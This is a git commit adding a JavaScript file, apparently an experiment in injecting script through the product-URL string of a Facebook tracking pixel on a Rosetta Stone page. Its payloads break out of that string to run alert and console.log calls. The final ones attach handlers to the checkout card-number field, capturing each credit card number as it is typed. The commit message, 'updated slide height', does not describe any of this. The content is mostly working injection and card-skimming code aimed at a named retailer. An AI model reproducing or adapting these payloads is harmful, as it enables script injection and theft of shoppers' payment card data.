4b5ea4cf316f3938020f864ac10abdeb8c255724
yaphi1 <yaphi1@gmail.com>
2016-03-03 17:11:22 -0500

    updated slide height

---
+++ jstests/fbhack.js
@@ -0,0 +1,126 @@
+// original code
+! function(f, b, e, v, n, t, s) {
+	if (f.fbq) return;
+	n = f.fbq = function() {
+		n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+	};
+	if (!f._fbq) f._fbq = n;
+	n.push = n;
+	n.loaded = !0;
+	n.version = '2.0';
+	n.queue = [];
+	t = b.createElement(e);
+	t.async = !0;
+	t.src = v;
+	s = b.getElementsByTagName(e)[0];
+	s.parentNode.insertBefore(t, s)
+}(window, document, 'script', '//connect.facebook.net/en_US/fbevents.js');
+fbq('init', '906502236100271');
+fbq('track', 'ViewContent', {
+	content_ids: ['http://www.rosettastone.com/#' - console.log(rs) - ''],
+	content_type: 'product',
+	product_catalog_id: '861073720666744',
+	currency: 'USD'
+});
+
+
+
+
+// experiments
+! function(f, b, e, v, n, t, s) {
+	if (f.fbq) return;
+	n = f.fbq = function() {
+		n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+	};
+	if (!f._fbq) f._fbq = n;
+	n.push = n;
+	n.loaded = !0;
+	n.version = '2.0';
+	n.queue = [];
+	t = b.createElement(e);
+	t.async = !0;
+	t.src = v;
+	s = b.getElementsByTagName(e)[0];
+	s.parentNode.insertBefore(t, s)
+}(window, document, 'script', '//connect.facebook.net/en_US/fbevents.js');
+fbq('init', '906502236100271');
+fbq('track', 'ViewContent', {
+	content_ids: ['http://www.rosettastone.com/#
+	']});alert('hello');fbq('track','ViewContent',{
+	content_type: 'product',
+	product_catalog_id: '861073720666744',
+	currency: 'USD'
+});
+
+
+
+
+
+
+// test with quotes
+! function(f, b, e, v, n, t, s) {
+	if (f.fbq) return;
+	n = f.fbq = function() {
+		n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+	};
+	if (!f._fbq) f._fbq = n;
+	n.push = n;
+	n.loaded = !0;
+	n.version = '2.0';
+	n.queue = [];
+	t = b.createElement(e);
+	t.async = !0;
+	t.src = v;
+	s = b.getElementsByTagName(e)[0];
+	s.parentNode.insertBefore(t, s)
+}(window, document, 'script', '//connect.facebook.net/en_US/fbevents.js');
+fbq('init', '906502236100271');
+fbq('track', 'ViewContent', {
+	content_ids: ['http://www.rosettastone.com/#
+	' - console.log('hi') - '
+	'],
+	content_type: 'product',
+	product_catalog_id: '861073720666744',
+	currency: 'USD'
+});
+
+
+
+
+
+
+
+
+// test with function
+fbq('track', 'ViewContent', {
+	content_ids: ['http://www.rosettastone.com/#
+	'-(function(){console.log('your rs variable is'+rs);})()-'
+	'],
+	content_type: 'product',
+	product_catalog_id: '861073720666744',
+	currency: 'USD'
+});
+
+
+
+
+
+
+// test with cc
+fbq('track', 'ViewContent', {
+	content_ids: ['http://www.rosettastone.com/#
+	'-(function(){document.getElementById('rspay_soap_cc_number').onchange = function(){console.log('credit card: '+this.value)};})()-'
+	'],
+	content_type: 'product',
+	product_catalog_id: '861073720666744',
+	currency: 'USD'
+});
+
+document.getElementById('rspay_soap_cc_number').onchange = function(){console.log('credit card: '+this.value)};
+
+
+var c = document.getElementById('rspay_soap_cc_number');
+c.onchange = function(){console.log('credit card: '+this.value)};
+
+
+
